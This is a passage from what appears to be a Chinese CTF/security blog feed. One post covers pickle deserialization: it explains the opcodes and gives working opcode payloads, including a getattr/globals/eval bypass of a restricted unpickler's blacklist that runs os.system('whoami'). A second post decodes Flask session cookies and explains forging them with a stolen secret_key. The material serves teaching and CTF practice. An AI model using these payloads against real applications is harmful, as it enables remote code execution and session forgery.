寻找上面的一个MARK，将之间的内容组成dict(字典)，之间的对象必须是偶数个，作为key-value对</p><p><code>7.b&#39;p&#39;</code>：将栈顶对象存至memo，等到要用的时候可以拿出来，使用方法是<code>px\n</code>(x可以是1，2，3…)，后面接一个换行，x在这里可以理解为在memo（一个字典）中的key值，注意此操作并不会对栈造成影响</p><p><code>8.b&#39;g&#39;</code>: 结合p使用，从memo中将指定对象压栈，使用方法，<code>gx\n</code>，同样接一个换行</p><p><code>9.b&#39;0&#39;:</code>pop操作，从栈中弹出一个对象</p><p><code>10.b&#39;b&#39;</code>:赋值操作，可以用于对象的实例化，将栈中的第一个元素（属性:属性值的字典)，赋值给第二个对象（类），实例化</p></blockquote><p>几个opcode的使用例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">opcode = <span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">opcode1 = <span class="string">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">opcode2 = <span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>上面三个都可以实现命令的执行</p><p>但官方针对pickle的安全问题，对引入模块做了限制，用白名单的方式，其中涉及到<code>pickle.Unpickler.find_class()</code>这个方法，在opcode做出引入模块的操作时，会调用这个方法（当出现<code>c</code>、<code>i</code>、<code>b&#39;\x93&#39;</code>时，会调用），限制也是在这里面实现</p><p>例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">safe_builtins = &#123;<span class="string">&#x27;range&#x27;</span>,<span class="string">&#x27;complex&#x27;</span>,<span class="string">&#x27;set&#x27;</span>,<span class="string">&#x27;frozenset&#x27;</span>,<span class="string">&#x27;slice&#x27;</span>,&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&quot;builtins&quot;</span> <span class="keyword">and</span> name <span class="keyword">in</span> safe_builtins:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %(module, name))</span><br></pre></td></tr></table></figure><p>重写这个方法，限制了引入的模块只能是<code>builtins</code>，子模块为<code>&#123;&#39;range&#39;,&#39;complex&#39;,&#39;set&#39;,&#39;frozenset&#39;,&#39;slice&#39;,&#125;</code></p><h3 id="0x03-题目例子"><a href="#0x03-题目例子" class="headerlink" title="0x03 题目例子"></a>0x03 题目例子</h3><h4 id="Code-Breaking-picklecode"><a href="#Code-Breaking-picklecode" class="headerlink" title="Code-Breaking:picklecode"></a>Code-Breaking:picklecode</h4><p>题目将pickle能够引入的模块限定为<code>builtins</code>，并且设置了子模块黑名单：<code>&#123;&#39;eval&#39;, &#39;exec&#39;, &#39;execfile&#39;, &#39;compile&#39;, &#39;open&#39;, &#39;input&#39;, &#39;__import__&#39;, &#39;exit&#39;&#125;</code></p><p>黑名单里面没有<code>getattr</code>，思路就是通过<code>getattr</code>拿到<code>builtins</code>的子模块<code>eval</code>实现任意代码执行</p><p>首先要拿到<code>builtins</code>模块，由于pickle无法引入一级模块（无父模块，解决方法，通过全局变量获取，在全局变量中存在<code>builtins</code>这个模块，因为已经引入了，<code>builtins.globals()</code>返回全局变量的dict</p><p>要从字典中拿到<code>builtins</code>，还需要用到方法<code>dict.get</code>，pickle不支持点访问，要使用的方法仍然是，先拿到<code>dict</code>模块。用<code>getattr</code>获取<code>get</code>方法</p><p>最后的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(getattr(builtins.dict,&#39;get&#39;)(builtins.globals(),&#39;builtins&#39;),&#39;eval&#39;)(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;)</span><br></pre></td></tr></table></figure><p>根据这个payload可以手写opcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="comment">#getattr(getattr(builtins.dict,&#x27;get&#x27;)(builtins.globals(),&#x27;builtins&#x27;),&#x27;eval&#x27;)(&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;)</span></span><br><span class="line">code = <span class="string">b&#x27;&#x27;&#x27;cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">p0</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">dict</span></span><br><span class="line"><span class="string">S&#x27;get&#x27;</span></span><br><span class="line"><span class="string">tRp1</span></span><br><span class="line"><span class="string">cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">)Rp2</span></span><br><span class="line"><span class="string">00g1</span></span><br><span class="line"><span class="string">(g2</span></span><br><span class="line"><span class="string">S&#x27;builtins&#x27;</span></span><br><span class="line"><span class="string">tRp3</span></span><br><span class="line"><span class="string">0g0</span></span><br><span class="line"><span class="string">(g3</span></span><br><span class="line"><span class="string">S&#x27;eval&#x27;</span></span><br><span class="line"><span class="string">tR(S&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line">pickle.loads(code)</span><br></pre></td></tr></table></figure><h3 id="0x04-pker使用"><a href="#0x04-pker使用" class="headerlink" title="0x04 pker使用"></a>0x04 pker使用</h3><p>使用pker，可以更方便的编写pickle opcode（版本是0）</p><p><a href="https://github.com/eddieivan01/pker">https://github.com/eddieivan01/pker</a></p><p>使用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">GLOBAL(&#39;os&#39;, &#39;system&#39;)             &#x3D;&gt;  cos\nsystem\n</span><br><span class="line">INST(&#39;os&#39;, &#39;system&#39;, &#39;ls&#39;)         &#x3D;&gt;  (S&#39;ls&#39;\nios\nsystem\n</span><br><span class="line">OBJ(GLOBAL(&#39;os&#39;, &#39;system&#39;), &#39;ls&#39;)  &#x3D;&gt;  (cos\nsystem\nS&#39;ls&#39;\no</span><br><span class="line">这三个分别对应opcode中的b&#39;c&#39;,b&#39;i&#39;,b&#39;o&#39;</span><br><span class="line"></span><br><span class="line">xxx(xxx,...)</span><br><span class="line">对应b&#39;R&#39;</span><br><span class="line"></span><br><span class="line">更新列表或字典的话，直接使用[]</span><br><span class="line">list[0]&#x3D;123</span><br><span class="line">dict[&#39;var&#39;] &#x3D; &#39;var1&#39;</span><br><span class="line">对应opcode中的b&#39;s&#39;</span><br><span class="line"></span><br><span class="line">对对象属性赋值</span><br><span class="line">xx.attr &#x3D; 123</span><br><span class="line">对应opcode中的b&#39;s&#39;</span><br><span class="line"></span><br><span class="line">return           &#x3D;&gt;  .</span><br><span class="line">return var       &#x3D;&gt;  g_\n.</span><br><span class="line">return 1         &#x3D;&gt;  I1\n.</span><br></pre></td></tr></table></figure><p>例题：还是上面那道Code-Breaking: picklecode</p><p>pker代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">getattr &#x3D; GLOBAL(&#39;builtins&#39;,&#39;getattr&#39;)</span><br><span class="line">dict &#x3D; GLOBAL(&#39;builtins&#39;,&#39;dict&#39;)</span><br><span class="line">dict_get &#x3D; getattr(dict,&#39;get&#39;)</span><br><span class="line">globals &#x3D; GLOBAL(&#39;builtins&#39;,&#39;globals&#39;)()</span><br><span class="line">builtins &#x3D; dict_get(globals,&#39;builtins&#39;)</span><br><span class="line">eval &#x3D; getattr(builtins,&#39;eval&#39;)</span><br><span class="line">eval(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;)</span><br><span class="line">return</span><br></pre></td></tr></table></figure><p><img src="/2021/07/24/pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Snipaste_2021-07-24_22-24-37.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#39;cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0g0\n(g1\nS\&#39;get\&#39;\ntRp2\n0cbuiltins\nglobals\n(tRp3\n0g2\n(g3\nS\&#39;builtins\&#39;\ntRp4\n0g0\n(g4\nS\&#39;eval\&#39;\ntRp5\n0g5\n(S\&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)\&#39;\ntR.&#39;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;0x01-pickle&quot;&gt;&lt;a href=&quot;#0x01-pickle&quot; class=&quot;headerlink&quot; title=&quot;0x01 pickle&quot;&gt;&lt;/a&gt;0x01 pickle&lt;/h3&gt;&lt;p&gt;pickle 是一种栈语言，有不同的编写方式，基于一个轻量的 &lt;code&gt;PVM（Pickle Virtual Machine）&lt;/code&gt;，包含三大部分&lt;/p&gt;</summary>
    
    
    
    <category term="其他" scheme="https://123-prog.github.io/categories/%E5%85%B6%E4%BB%96/"/>
    
    
    <category term="pickle" scheme="https://123-prog.github.io/tags/pickle/"/>
    
    <category term="反序列化" scheme="https://123-prog.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="opcode使用" scheme="https://123-prog.github.io/tags/opcode%E4%BD%BF%E7%94%A8/"/>
    
    <category term="pker使用" scheme="https://123-prog.github.io/tags/pker%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>flask session问题</title>
    <link href="https://123-prog.github.io/2021/07/23/flask-session%E9%97%AE%E9%A2%98/"/>
    <id>https://123-prog.github.io/2021/07/23/flask-session%E9%97%AE%E9%A2%98/</id>
    <published>2021-07-23T15:14:08.000Z</published>
    <updated>2021-07-24T16:05:16.141Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-flask-session篡改"><a href="#0x01-flask-session篡改" class="headerlink" title="0x01 flask session篡改"></a>0x01 flask session篡改</h3><a id="more"></a><p><code>flask session</code> 构成：<code>data.timestamp.signal</code></p><p>flask将session存储在客户端的cookie中，那么就有被篡改的可能，flask用签名解决这个问题，在不知道<code>secret_key</code>的情况下，是无法伪造签名的，一但拿到<code>secret_key</code>，就可以篡改session</p><p>flask序列化session的步骤：</p><blockquote><p>1.将对象转换成json字符串，作为session的数据部分</p><p>2.如果数据压缩后长度更短，用zlib库压缩</p><p>3.将数据进行base64编码</p><p>4.通过hmac算法计算出数据的签名，将签名附在数据后，用”.“分割</p></blockquote><p>签名可以验证数据是否被更改过</p><p><strong>根据这个过程，可以用这个脚本解密出数据:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span>(<span class="params">payload</span>):</span></span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">&#x27;.&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">&#x27;.&#x27;</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;解码失败&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&quot;Could not zlib decompress the payload before decoding the payload&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    print(decryption(sys.argv[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure><p><img src="/2021/07/23/flask-session%E9%97%AE%E9%A2%98/Snipaste_2021-07-23_23-27-44.png"></p><p>如果可以通过其他方式拿到<code>secret_key</code>的话，就可以更改数据，生成签名，篡改<code>session</code></p><p>生成session的脚本：</p><p><a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;0x01-flask-session篡改&quot;&gt;&lt;a href=&quot;#0x01-flask-session篡改&quot; class=&quot;headerlink&quot; title=&quot;0x01 flask session篡改&quot;&gt;&lt;/a&gt;0x01 flask session篡改&lt;/h3&gt;</summary>
    
    
    
    <category term="其他" scheme="https://123-prog.github.io/categories/%E5%85%B6%E4%BB%96/"/>
    
    
    <category term="客户端session" scheme="https://123-prog.github.io/tags/%E5%AE%A2%E6%88%B7%E7%AB%AFsession/"/>
    
    <category term="session伪造" scheme="https://123-prog.github.io/tags/session%E4%BC%AA%E9%80%A0/"/>
    
  </entry>
  
</feed>
